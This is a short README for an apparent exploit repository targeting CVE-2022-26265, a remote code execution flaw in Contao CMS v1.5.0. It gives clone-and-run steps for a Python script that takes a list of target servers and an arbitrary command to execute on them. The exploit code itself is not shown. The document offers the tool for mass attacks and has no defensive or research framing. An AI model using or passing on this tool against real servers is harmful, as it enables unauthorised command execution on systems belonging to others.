# CVE-2022-26265 (Contao CMS RCE)

This repo is part of the ***hgrab-framework***

### Affected product
  - Contao CMS v1.5.0

### Installation
Install the app on the server
```sh
user@domain:~# git clone https://github.com/Inplex-sys/CVE-2022-26265.git
user@domain:~# cd ./CVE-2022-26265/
user@domain:~# python3 main.py <list.txt> <command>
```

The list file must contain the targets servers with this format `<http-https>://<target>:<port>/<uri-(optional)>`
